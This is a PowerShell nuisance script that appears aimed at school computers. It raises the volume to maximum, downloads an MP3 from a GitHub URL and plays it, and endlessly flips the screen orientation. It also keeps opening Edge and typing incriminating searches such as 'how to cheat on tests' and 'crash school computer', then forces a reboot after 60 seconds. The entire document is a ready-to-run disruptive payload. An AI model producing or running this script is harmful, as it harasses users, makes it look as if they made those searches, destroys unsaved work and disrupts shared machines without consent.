Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Media
Add-Type -AssemblyName System.Drawing

# Set volume to 100%
$wshell = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt 50; $i++) {
    $wshell.SendKeys([char]175)  # Volume Up key
    Start-Sleep -Milliseconds 10
}

# Download and play MP3
$mp3Path = "$env:TEMP\payload.mp3"
Invoke-WebRequest -Uri "https://github.com/Anarxyfr/fdsa/raw/refs/heads/main/4b96811d-1725-4694-bf60-c3f3e54b5f94.mp3" -OutFile $mp3Path
$player = New-Object System.Media.SoundPlayer
$player.SoundLocation = $mp3Path
$player.Play()

# Start infinite orientation flipping
Start-Job -ScriptBlock {
    $keys = @("^{%}{LEFT}","^{%}{RIGHT}","^{%}{UP}","^{%}{DOWN}")
    while ($true) {
        [System.Windows.Forms.SendKeys]::SendWait($keys | Get-Random)
        Start-Sleep -Seconds 3
    }
}

# Spam Edge with search typing
Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    $searches = @(
        "chromebook annihilation",
        "how to cheat on tests",
        "how to play games in school",
        "bypass school wifi",
        "install games without admin",
        "crash school computer"
    )
    while ($true) {
        $query = $searches | Get-Random
        Start-Process "msedge.exe"
        Start-Sleep -Seconds 2
        foreach ($char in $query.ToCharArray()) {
            [System.Windows.Forms.SendKeys]::SendWait($char)
            Start-Sleep -Milliseconds 30  # ~200WPM
        }
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        Start-Sleep -Seconds 3
    }
}

# Wait 60 seconds then restart
Start-Sleep -Seconds 60
Restart-Computer -Force
